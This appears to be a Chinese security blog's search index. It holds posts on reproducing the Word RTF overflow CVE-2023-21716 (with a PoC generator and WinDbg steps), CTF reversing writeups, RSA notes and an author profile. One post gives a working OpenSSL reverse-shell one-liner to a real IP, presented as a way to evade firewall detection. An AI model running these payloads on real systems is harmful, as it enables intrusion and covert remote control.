[{"categories":null,"content":"CVE-2023-21716","date":"2023-03-08","objectID":"/posts/cve-2023-21716%E5%A4%8D%E7%8E%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/","tags":["漏洞","CVE"],"title":"CVE-2023-21716 Microsoft Word远程代码执行漏洞（持续更新）","uri":"/posts/cve-2023-21716%E5%A4%8D%E7%8E%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":null,"content":"随记 今天上班，正好看到了来自机器人和同事的双重消息，本来还在琢磨这月渗透啥带劲点，但，它实在是太诱人了，远程执行，溢出，这次主要问题在于word中wwlib动态链接库在调用中的溢出，话不多说，我们来复现一下。 ","date":"2023-03-08","objectID":"/posts/cve-2023-21716%E5%A4%8D%E7%8E%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:0","tags":["漏洞","CVE"],"title":"CVE-2023-21716 Microsoft Word远程代码执行漏洞（持续更新）","uri":"/posts/cve-2023-21716%E5%A4%8D%E7%8E%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":null,"content":"准备工作 在开工之前，我们需要准备以下工具和环境对这个漏洞进行复现： Windbg（需要根据你的操作系统进行选配，我是windows11，所以无脑点最新的Windows SDK） Python（生成POC） Office Word（ps:废话 →_→） 因为我自己正好有Office 365的订阅，虽然报告人员当时提到至少影响的有Office365 Build 15831.20122这个版本，而我的版本比这个版本更高一点，是16130.20218 但很不幸，提前说一句，也中招了。 ","date":"2023-03-08","objectID":"/posts/cve-2023-21716%E5%A4%8D%E7%8E%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:1","tags":["漏洞","CVE"],"title":"CVE-2023-21716 Microsoft Word远程代码执行漏洞（持续更新）","uri":"/posts/cve-2023-21716%E5%A4%8D%E7%8E%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":null,"content":"开工 首先，我们需要将poc生成出来，这里我将代码放在这里，然后说明一下基本原理（细说放到后续对于wwlib.dll这个文件的解析中）： import sys num = 32761 if len(sys.argv) \u003e 1: num = int(sys.argv[1]) f = open(\"CVE-2023-21716.rtf\", \"wb\") f.write(\"{\\\\rtf1{\\n{\\\\fonttbl\") for i in range(num): f.write(\"{\\\\f%dA;}\\n\" % i) f.write(\"}\\n\") f.write(\"{\\\\rtlch it didn't crash?? no calc?! BOO!!!}\\n\") f.write(\"}}\\n\") f.close() 这个报告人员还挺好玩的说:-) （译：给你一点小小的崩溃震撼） 我们来看一下这个代码，第六行的\"{\\\\rtf1{\\n{\\\\fonttbl\"，意图构建一个rtf格式的文件，而\\fonttbl则是用于控制字体以及引入字体表，这次漏洞的溢出点也在这个地方，循环构造多个字体id，使fonttbl处理过多字体，从而造成溢出（由于本人精力和能力有限，在下次更新时解读此处的处理细节） 生成的文件详情如下 接下来我们使用windbg对word进行调试，至于怎么引入可执行文件啥的就不赘述了 要是找不到word在哪，那就随便打开一个自己去定位一下，文件名为WINWORD.EXE 进入到windbg后，首先输入e ebx+2 00命令，修改ebx+2内存地址的值，隐藏调试器，然后再输入xe ld:wwlib,运行直到 wwlib被加载，最后输入k，我们可以观察到此处的溢出提示 补一下运行bp wwlib+0x37f0bd \".printf \\\"*** edx will become: 0x%x (from 0x%x+0x%x*2)\\\\n\\\", (ecx+edx*2), ecx, edx;gc\"和bp wwlib+0x37f0c3 \".printf \\\"*** writing 0x%x to 0x%x [0x%x+0x%x*2+4] (div 3: 0x%x)\\\\n\\\", ecx \u0026 0xffff, (esi+(edx*2)+4), esi, edx, edx/3;gc\"的结果（2023-3-9） 提示 此处我其实纳闷了好久xe的作用，因为按照微软官方的文档中只有一个sxe命令，但没有xe，在我查阅前人的资料时注意到这个xe命令也很难找到解释，后来在这个链接，注意到这段话 xe和sxe在我所能收集到的调试器解释中都在表明这是在做错误处理，在下一句的g命令执行时，载入我们的poc时能够跳出调试器，否则命令输入框就会出现\"debugger is running\"的字样，也就无法再输入k命令来显示堆栈信息。 最后我们也就能得到吗，例如奇安信CERT复现的内容了 《未完待续，关于wwlib的逆向分析》 ","date":"2023-03-08","objectID":"/posts/cve-2023-21716%E5%A4%8D%E7%8E%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/:1:2","tags":["漏洞","CVE"],"title":"CVE-2023-21716 Microsoft Word远程代码执行漏洞（持续更新）","uri":"/posts/cve-2023-21716%E5%A4%8D%E7%8E%B0%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/"},{"categories":null,"content":"Linux的技巧记录","date":"2023-01-30","objectID":"/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/","tags":["Linux"],"title":"Linuxの小伎俩-1","uri":"/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/"},{"categories":null,"content":"起因 在最近的生活中，经常需要在渗透场景下拿到Shell从而进一步对于靶机的控制以及横向移动等操作（其实是拿到Shell好敲command的罢了），但毕竟在内网的环境中，那些防火墙也不是吃素的，如果只是使用常用的反弹shell操作也是很容易被监测到的（管你netcat还是调用Linux的Socket，即/dev/tcp，那都是木大木大木大），那么我们就需要在这简单的传输过程中加一点点的料从而达到伪装的效果（不然，流量裸奔？生怕防火墙眼瞎？），这时我们可以考虑加密这条通信线路从而完成对于特征检测的绕过（其实例如众所周知的冰蝎等知名内存马的基础原理也是如此，而能够穿越国境线的原理也是如此），当然了，这里不对自定义的反弹shell程序做的赘述，其实我自己也在手搓ing（内存马），下面在这里开始介绍一种较为简单的手法达成上述的功能。 ","date":"2023-01-30","objectID":"/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/:1:0","tags":["Linux"],"title":"Linuxの小伎俩-1","uri":"/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/"},{"categories":null,"content":"Openssl \u0026 Bash 话不多说，上命令 mkfifo /tmp/fifofile; /bin/bash -i \u003c /tmp/fifofile 2\u003e\u00261 | openssl s_client -quiet -connect 39.101.74.100:1234 \u003e /tmp/fifofile; rm /tmp/fifofile 这里需要注意39.101.74.100:1234，这个需要换成你用于接收shell的服务器地址和端口。 一眼望去可能有的人开始头晕脑胀了，这句话究竟是在干嘛，下面我们就把这句话一段一段地来解读。其中这句话要分为三部分去看，即 mkfifo /tmp/fifofile #1 /bin/bash -i \u003c /tmp/fifofile 2\u003e\u00261 \\ | openssl s_client -quiet -connect 39.101.74.100:1234 \u003e /tmp/fifofile #2 rm /tmp/fifofile #3 Linux的管道大家应该都知道（不知道的出门去baidu,去google），而Linux提供了FIFO文件（FIFO special files），而其又称为命名管道（named pipe），顾名思义，这个文件类似管道“PIPE”，但可被命名的，其详细特性以及两者的不同这里不赘述，自行了解(指路：GNU官网对于PIPE和FIFO的介绍)，这里只需要知道是一个可以让不同进程进行通信、且以先进先出的方式进行数据读取的方式（IBM 介绍）。 而我们的第一句mkfifo /tmp/fifofile 则是在tmp目录下创建一个名为 fifofile 的FIFO文件 第二句可能有点费劲，但我已经用\\符号把这句话隔开来读，首先关注/bin/bash -i \u003c /tmp/fifofile 2\u003e\u00261这句话 其中我们需要理解的部分主要是这里的流的去向究竟是怎样的，首先这里引入文件描述符的概念，见下表 文件描述符 含义 0 标准输入（stdin） 1 标准输出（stdout） 2 标准错误输出（stderr） 而我们首先从简单的部分进行入手，/bin/bash -i \u003c /tmp/fifofile这句话是将fifo文件的内容以标准输入的方式给到bash中，其中此时的因为后面2\u003e\u00261的缘故，bash执行完fifo文件内的命令后，其标准输出（1）和标准错误输出（2）一并指向标准输出，是不是很拗口？我们用一个列表表示一下： 最开始的/bin/bash -i \u003c—— 0 (stdin) 由于使用了\u003c输入重定向，执行了\u003c/tmp/fifofile ，有 0\u003c—— /tmp/fifofile /bin/bash这个命令执行完了总得有输出吧？，那么有 /bin/bash \u003c /tmp/fifofile ——\u003e 1(stdout) 最后执行2\u003e\u00261，有2(stderr) ——\u003e 1(stdout) 现在如果不进行下面的语句，有 1 ——\u003e 屏幕 （不过按照如上的命令会卡在那，因为 -i 选项开了交互式shell 🤣） 提示 到这里可能有人还是晕着的，在这里请务必明确一个原则，重定向的语句执行方向按照你写的重定向符号来，但是你作为人类去阅读这句话，以及Bash本身对于重定向的处理方向都是从左往右读（详情见Bash Reference Manual 3.6节第一大段） 不过在我对2\u003e\u00261祖坟上刨根前，也疑惑一个错误输出的重定向直接2\u003e1不就完活了吗，但也注意到这样的句子会有歧义（Bash：我咋知道你是重定向给标准输出，还是重定向给文件名为1的文件？），那群上世纪的老先生肯定早就想到了😆，所以就翻到Bash Reference Manual的3.6.4节仔细看看。 结果还有\u0026\u003e这样的写法，在没看完整段介绍前我心急地用了这个试了一下碰一鼻子灰，然后在最后一句看到说明 使用第二种(\u003e\u0026)用法时，不能使用数字或者’-’，如果单纯看机翻，不了解数字的含义换我我也懵，这里也就很明确了，如果你用了数字，例如0/1/2，那么这句话的处理方式就不是把标准输出和标准错误输出重定向到文件里，而是文件描述符，如果仔细注意官方文档的案例，它说了\u0026\u003eword和\u003e\u0026word等价于 \u003eword 2\u003e\u00261，那个2\u003e\u00261的用途也就是定义说的那样（其实把这些东西当做指针去理解会很容易） 第二句前半段说完，我们来看看后半段，即| openssl s_client -quiet -connect 39.101.74.100:1234 \u003e /tmp/fifofile，上面说到bash运行之后的结果和错误都丢到标准输出中了，到这一句将通过|管道符，把上个命令的标准输出作为这一句的标准输入传给openssl，而s_slient参数将构造一个通用SSL/TLS客户端，而重头戏也就来了，-quiet参数会禁止打印会话以及证书信息，但同时也会开启-ign_eof选项(Openssl文档) 翻译的意思是禁止在输入达到文件末尾时断开连接，这对于渗透场景而言是非常重要的，因为需要持久化反弹的Shell，bash的输出也就通过这个命令发给攻击者机器，同时，攻击者发送的命令，也会通过\u003e符号重定向输入fifo文件中，将这一系列的功能联系起来我们就能得到一个清晰的结构。 到此，也对这些指令本身的处理有了更深刻的理解，所以已经不着急东搞西搞，因为越学越发现贫瘠之处多到令人发指，天天用现成的我会睡不安，所以我选择： 搞错了😆！git push xxxx（前面说了最近在写病毒） ","date":"2023-01-30","objectID":"/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/:1:1","tags":["Linux"],"title":"Linuxの小伎俩-1","uri":"/posts/linux%E3%81%AE%E5%B0%8F%E4%BC%8E%E4%BF%A9/"},{"categories":null,"content":"攻防世界 Re题 echo server","date":"2022-11-15","objectID":"/posts/xctf-gfsj0381-echo-server/","tags":["攻防世界","逆向工程"],"title":"GFSJ-0381-echo-server","uri":"/posts/xctf-gfsj0381-echo-server/"},{"categories":null,"content":"之前iPad上手写推导了一部分，然后有时候也想结合应用，但一时半会太杂了，我就先把iPad上手写的推导放这里转为Latex存着，反正有空没事就捣鼓捣鼓，顺便记录一下实际场景结合","date":"2022-11-09","objectID":"/posts/rsa%E5%B0%8F%E8%AE%B0-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/","tags":["密码学"],"title":"RSA小记-长期更新","uri":"/posts/rsa%E5%B0%8F%E8%AE%B0-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"},{"categories":null,"content":"RSA theory（理论） ","date":"2022-11-09","objectID":"/posts/rsa%E5%B0%8F%E8%AE%B0-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/:1:0","tags":["密码学"],"title":"RSA小记-长期更新","uri":"/posts/rsa%E5%B0%8F%E8%AE%B0-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"},{"categories":null,"content":"RSA derivation procedure （推导过程） variable p and q is prime number ! （素数） now，let N=p*q According to Euler function（欧拉函数） $$\\because \\varphi(n)=n(1-\\frac{1}{p_1})(1-\\frac{1}{p_2})(1-\\frac{1}{p_3})…(1-\\frac{1}{p_n})$$ $$\\varphi(n)=n\\displaystyle\\prod_{i=1}^n (1-\\frac{1}{p_i}) $$ $$ \\begin{cases} \\varphi(p)=p-1 \\\\ \\varphi(q)=q-1 \\end{cases} $$ $$ \\therefore \\varphi(pq)=\\varphi(p)\\varphi(q)=(p-1)(q-1)=\\varphi(N) $$ Here, we get the conclusion $\\varphi(N)=(p-1)(q-1)$ let variable $r$ be equal to $\\varphi(N)$ Then we take a random number $e$ ($1\u003ce\u003cr$) and the condition is $gcd(e,r)=1$(取最大公约数),the purpose of this is to take modular multiplicative inverse element(这是模反元素的意思，你如果使用谷歌翻译和有道词典都没法正确地得到该词汇的正确英文解释) Let the modular multiplicative inverse element mentioned above be $d$ $$ ed\\equiv 1 \\pmod r \\implies (ed-1) \\bmod r =0 $$ $$\\tag{Q1}\\frac{ed-1}{r}=k \\implies ed-1=kr$$ Q1 由于本部分已经进入重点，且我的英语实在烂，暂时先用中文写着，其实写这篇小记也是为了顺带练英语的 当时这里没啥问题，但主要在通过下文的（我这下班写的，肚子咕咕叫，等回去再写，反正谷歌一下也知道我后面要干啥的），使用扩展欧里几德算法，在$\\text{(mod r)}$这个条件下，出现$ed+kr=1$这种东西，并且还能得到以下方程 $$ \\begin{cases} ed+kr=1 \\\\ ed-kr=1 \\\\ \\end{cases} $$ 其实在维基百科上，中文的解释只有如下： 事实上，$x+kn(k \\in \\mathbb{Z} )$都是$e$关于模$r$的模反元素，这里我们取最小的正整数解 但是这里的解释实在是让人无法让人安心，因为强迫症的缘故，还是想一探究竟（其实冥冥之中感觉到和k相关，联想到因轴的变化造成的方程不同，但还是一个方程） 所以，从头翻了翻英文版的维基百科逐渐，在computation里找到了我们所需要支撑的一句话： In other words,integers x and y can be found to satisfy Bézout’s identity(贝祖定理) 这里的意思结合上面为： 在使用扩展欧几里得算法求得模反元素之前，需要满足贝祖定理 而在贝祖定理的证明中（见proof章节），其第一句为： Given any non-zero integers a and b , let: $S=\\lbrace ax+by:x,y \\in \\mathbb{Z} \\And ax+by\u003e0 \\rbrace$ 《未完待续-回家干饭》 ","date":"2022-11-09","objectID":"/posts/rsa%E5%B0%8F%E8%AE%B0-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/:1:1","tags":["密码学"],"title":"RSA小记-长期更新","uri":"/posts/rsa%E5%B0%8F%E8%AE%B0-%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"},{"categories":null,"content":"2022-全国大学生信息安全竞赛安徽省赛攻防赛道部分Writeup","date":"2022-10-09","objectID":"/posts/2022-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93-%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/","tags":["竞赛-题解"],"title":"2022-全国大学生信息安全竞赛安徽省赛攻防赛道部分Writeup","uri":"/posts/2022-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93-%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/"},{"categories":null,"content":"本科组 ","date":"2022-10-09","objectID":"/posts/2022-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93-%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/:1:0","tags":["竞赛-题解"],"title":"2022-全国大学生信息安全竞赛安徽省赛攻防赛道部分Writeup","uri":"/posts/2022-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93-%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/"},{"categories":null,"content":"Reverse-protect eyes 稀碎稀碎 开局就逆向，真有你的嗷，老六开局是吧 下面我们一起狠狠地掀开老六面纱 首先，拿到这道题，是个jar包，我们可以拿常见的反编译工具，例如jadx，丢过去瞅瞅 打开这个jar，是个GUI程序 同时我们注意到这里有很多莫名其妙的乱码，可以先不管，把反编译的代码导出，并用idea去打开看（主要是方便调试，裸看也可以） 这里我们很容易知道是用来判别我们的输入是否正确的（JOptionPane.showInputDialog），粗略得知该方法返回的值是决定提示正确与否的，接下来我们开始跟踪这个名为C0000的类里面代码逻辑 从这个名为m6的函数入手 这里不难看出，m6函数其实根据循环体内的规律比对我们的输入，每四位的取值，本来想着本题放初赛还是个第一题应该没啥难度，我想很多人也都卡在这里了 但仔细看看这个System.arraycopy函数，跟进方法实现，发现它并不是我们熟知的那位 恍然大悟上了当！ 而所谓的这句 f0_ = System.arraycopy(f1_, 0, f0_, 5, 5); 它就是晃你的，屁用没有，什么f1_,f_0都是来凑数晃人的，为的是调用这句 return Start.main(null); 这个null嘲讽效果很好，意思就是，真的之前的屁用没有 下面我们来看看这个Start.main是在干什么 （这个地方有个jadx反编译有错误，可以用jd-gui去看，如果时间长了你会发现既然上面调用的时候参数给的null了，也不存在有其他因素了，只能把charArray这个字符数组当做是下面那个乱码） 不难看出是这里是在做右移一位的操作，同时加15，将得到的这个新的字符串返回到最开始比较的那个地方，所以这个System.arraycopy其实就相当于直接唤起Start.main 回到C0000，我们也就很容易知道下面的步骤了，下面的步骤也就只有复现这句 str.charAt(i + i3) != f0_.charAt(Start.m0(i + i3, f0_)) 而我们此时也就可以开始编写脚本还原上面的操作 def startmain(): x=\"\" tmp=\"vÈ¾¤ÊÊ¬ÆÆÊvÌ¤Ê²Ê²ÀÎ¤¨¸¬\" for i in range(len(tmp)): x+=chr((ord(tmp[i])\u003e\u003e1)+15) return x def m0(i,String): return m1(i) % len(String) def m1(i): if i \u003e 2: return m1(i - 1) + m1(i - 2) else: return 1 def m6(): # f0_ = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\" # f1_ = \"ZYXWVUTSRQPONMLKJIHGFEDCBA\" f0=\"JsnatterrtJuaththovacke\" i=0 flag='' for i2 in range(4): for i3 in range(4): flag+=(f0[m0(i+i3,f0)]) i += 5 print(flag[0:4]+'-'+flag[4:8]+'-'+flag[8:12]+'-'+flag[12:16]) #见输入要求格式XXXX-XXXX-XXXX-XXXX #sssn-trtk-tcea-akJr if __name__ == '__main__': m6() 然后我们也就得到了本场的flag flag{sssn-trtk-tcea-akJr} ","date":"2022-10-09","objectID":"/posts/2022-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93-%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/:1:1","tags":["竞赛-题解"],"title":"2022-全国大学生信息安全竞赛安徽省赛攻防赛道部分Writeup","uri":"/posts/2022-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93-%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/"},{"categories":null,"content":"Misc-Base_family_bucket 本题思路提供者为学弟 @北风一一 其实拿到这题第一反应是，这么长的密文，base的体系里都是以可见字符的形式进行的，也就是密文无论如何你都不能搞出乱码，超出字典表范围，所以开始也是以缩短密文的形式来解开本题 显然还是被套路了，在赛后学弟的提示下，多出的两次url解密就很让人麻了 下面的是操作步骤 首先打开这个txt文本，注意到全都是一览无际的数字，我们需要对其进行一点处理，每两位放置一个百分号(%) 其作用是将这数字变为url编码的模样，这样后续方便进行解码 stringdate":"2022-10-09","objectID":"/posts/2022-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93-%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/:1:2","tags":["竞赛-题解"],"title":"2022-全国大学生信息安全竞赛安徽省赛攻防赛道部分Writeup","uri":"/posts/2022-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93-%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/"},{"categories":null,"content":"高职组 ","date":"2022-10-09","objectID":"/posts/2022-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93-%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/:2:0","tags":["竞赛-题解"],"title":"2022-全国大学生信息安全竞赛安徽省赛攻防赛道部分Writeup","uri":"/posts/2022-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93-%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/"},{"categories":null,"content":"Reverse-证明自己吧 这道题是找赛事群的群友给的，因为我在本科组是看不到高职的赛事题目，平时手痒痒我就自己也一并做了 下面我们来看看这题的做法吧！ 这题的做法其实只需要找到对应比较的逻辑也就出来了，可以动态调试也可以静态调试 下面就先运行一下看看这题要我们干什么 好吧，看来又是要我们提交什么来核验结果，把这程序丢到ida里看看 显然核心的部分在函数sub_401060里面，跟踪进去 这里其实答案就已经糊在脸上，其实就是那俩for循环，将输入的值相同处理就可以达到一样的效果 有人疑惑咋就结束力！？ 给你翻译翻译 所谓的 *((_BYTE *)v5 + v3 + a1 - (const char *)v5) == *((_BYTE *)v5 + v3) 等价于 *(a1+v3)==*(v5+v3) 所以本题题解也就很简单明了辣，复现本次的代码逻辑即可 v5=[0x68, 0x57, 0x19, 0x48, 0x50, 0x6E, 0x58, 0x78, 0x54, 0x6A, 0x19, 0x58, 0x5E, 0x06] for i in range(len(v5)): v5[i]-=5 v5[i]^=0x20 flag=\"\" for j in range(len(v5)): flag+=chr(v5[j]) print(flag) #Cr4ckIsSoE4sy! 本文并未结束哦，深入的可以看看下面，后期我有空的话会另起一个专栏 ↓ 刨根 抱着学习的目的，这次我们就刨根问底一点，来借此复习深入一下汇编 可能有些新人的脑瓜子是懵的，为什么被定为整型的v5搁在strlen里面进行运算呢？其实这里就需要追溯到它的汇编层面了，我们这里来定位一下这句话所在汇编代码块，注意图中的我选中的区域 or ecx, 0FFFFFFFFh xor eax, eax mov edx, dword_407094 repne scasb not ecx dec ecx 这一部分其实就是所有人都熟知的strlen的底层实现，其中最关键的部分在于 repne scasb 这句话上，在查阅 《Intel® 64 and IA-32 Architectures Software Developer’s Manuals》 ，也就是 《英特尔® 64 位和 IA-32 架构开发人员手册》 得知，repne 的作用是当ECX寄存器的值不为0(ECX!=0)且ZF标志位清空时(ZF==0)时，将会重复执行后面的指令，同时ecx会减去1，也就是重复执行scasb指令，而同样的，scasb的作用是搜索字符串，搜索到edi寄存器(字符串)末尾的0为止。到这为止我们其实还是不能够完全确定，但是，注意看or ecx,0xFFFFFFFFh，把ecx寄存器置为-1，也就是“意图”要从头到尾过一遍，机灵的孩子已经反应过来是求长度的，后面的not ecx其实就是把ecx减去的次数算出来，但这个是包括了最后的’\\0’，其实自己回忆一下sizeof就知道了，dec ecx就是自减1咯，得到真正的字符串长度 而有的人可能疑惑，为啥伪代码里蹦出了这样的一串设定 int v5[3]; // [esp+Ch] [ebp-10h] BYREF __int16 v6; // [esp+18h] [ebp-4h] char v7; // [esp+1Ah] [ebp-2h] v5[0] = dword_40708C; v5[1] = dword_407090; v6 = word_407098; v7 = byte_40709A; v5[2] = dword_407094; 我们回忆一下上面所提到的 scasb指令，其实我们可以把它理解成是scas byte (工具并不是万能的，它只能说是辅助我们去更快速的进行渗透和攻击，以及快速解读当前程序控制流，并不是一劳永逸的) 同理ida也不是万能的，我们需要结合动态调试以及自己观察去人工修正ida的分析 这里我们可以用x64dbg调试一下，在内存窗口里我们可以跟踪到当时ida里的v5，一串连续的数据 我们在ida稍微修正一点，是不是看起来舒服多了 当然口算也行(乐) 最后，我只想说一句，下回奇安信赶紧把比赛修好平台⑧ ","date":"2022-10-09","objectID":"/posts/2022-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93-%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/:2:1","tags":["竞赛-题解"],"title":"2022-全国大学生信息安全竞赛安徽省赛攻防赛道部分Writeup","uri":"/posts/2022-%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93-%E9%80%86%E5%90%91%E9%A2%98%E8%A7%A3/"},{"categories":null,"content":" CVE-2022-41082/CVE-2022-41040分析","date":"2022-10-01","objectID":"/posts/exchange-server-2022-9-28%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%9E%90/","tags":["CVE"],"title":"Exchange-Server-2022年9月28日漏洞小析","uri":"/posts/exchange-server-2022-9-28%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%9E%90/"},{"categories":null,"content":"Ne0AC2G's friends","date":"2022-09-28","objectID":"/friends/","tags":null,"title":"友情链接","uri":"/friends/"},{"categories":null,"content":"关于网站 其实初中那会儿是搭建过个人博客的，然后也就无声无息的停掉了(其实是莫得钱) 转眼间大学生活还有一年不到就结束了，留下这个博客，也算是将我的过去，现在，以及将来可以被公开的好玩的事情以及技术留在这里，是我自己记忆的存档，也当做是我留给后面几届的礼物了吧 除了这个网站之外，还有几个网站，在此作为导航 站名 域名 安徽信息工程学院-信息安全方向班训练平台 https://aiitoj.cn 全国大学生信息安全竞赛安信工校赛平台 https://team.aiitoj.cn ctf-wiki https://docs.aiitoj.cn 服务集群 https://panel.aiitoj.cn ","date":"2022-09-27","objectID":"/about/:1:0","tags":null,"title":"关于*","uri":"/about/"},{"categories":null,"content":"关于我 ","date":"2022-09-27","objectID":"/about/:2:0","tags":null,"title":"关于*","uri":"/about/"},{"categories":null,"content":"简述 🏢来自：@奇瑞集团-菜鸡安全从业人员 @AIIT(23届) 💻总结：虚假的全栈手 💿技能：问啥啥不行，用啥啥不会，雨露均沾学习法，超寄级信安小子 🌟 正经技能：熟练掌握红蓝对抗技术，曾完成Web前后端完整赛事系统开发，Oauth2认证开发，嵌入式开发（51、Arduino、raspberryPi、Nvidia nano），人工智能相关开发（神经网络，回归模型，爬虫技术Scrapy），安全技术相关开发（入侵检测），无人驾驶技术开发（ROS框架体系，对路径算法有一定了解） ","date":"2022-09-27","objectID":"/about/:2:1","tags":null,"title":"关于*","uri":"/about/"},{"categories":null,"content":"详述 🌠赛事经历(包含证明材料) 2020 年全国大学生数学建模竞赛省级二等奖 2020 年全国大学生信息安全竞赛攻防赛省级三等奖 2020 年安徽省高校物联网应用创新大赛创意组优秀奖 2021 年全国大学生智能汽车竞赛讯飞智能餐厅组全国三等奖 2021 年全国大学生智能汽车竞赛双车组全国二等奖 2021 年全国大学生智能汽车竞赛讯飞智慧餐厅组省级二等奖 2021 年全国大学生智能汽车竞赛双车组省级一等奖 2021 年安徽省机器人大赛 RoboCup 仿真 2D 比赛省级三等奖 2021 年安徽省高校物联网应用创新大赛创意组二等奖 2021 年安徽省高校物联网应用创新大赛技能组三等奖 2021 年中国计算机设计大赛省级三等奖 2021 年互联网＋大学生创新创业大赛省级银奖 2021 年全国大学生信息安全竞赛攻防赛省级三等奖 2021 年全国大学生信息安全竞赛作品赛省级三等奖 ⚡项目经历 2021 年国家级大学生创新创业项目-ROS 智能机器人在智慧餐厅的应用 2021 年国家级大学生创新创业项目-基于语音交互的智能药物多装装置 2021 年国家级大学生创新创业项目-基于逆向语音识别技术的盲人专用阅读眼镜 2021 年省级大学生创新创业项目-基于信息隐藏的 sm2 加密信息传递 2021 年省级大学生创新创业项目-基于树莓派的智慧校园系统 2021 年省级大学生创新创业项目-基于深度学习的网络入侵检测 2021 年省级大学生创新创业项目-基于计分卡模型的企业信贷评估系统 🔥在校其他个人经历 我校合格评估预评估时期，ROS 智能车项目演示 2021 年全国大学生信息安全竞赛校内选拔赛-竞赛系统适配作者，出题人，裁判 2021 年信息安全方向班期末考试平台部署与部分出题 协助北京交通大学硕士，博士完成课设代码 2022-2023年护网行动红方（防守方），攻击溯源和反制 ","date":"2022-09-27","objectID":"/about/:2:2","tags":null,"title":"关于*","uri":"/about/"},{"categories":null,"content":"💖自我评价 无论未来有多少险阻，我都会迎难而上！在能维持生计的情况下，只想安安心心去研究这门我所热爱的安全技术，为我国网络空间安全建设付出全部的心血，既来之，则安之，在哪，我都会尽职尽责，保护我身后的数据直到最后一刻。 另外上面的奖项已经是过去式，建议让我本人上场行动行动（2023-7-10） ( 其实我很想说的是，我可能没科学家的脑子，只是有一心科研的愿望 ) 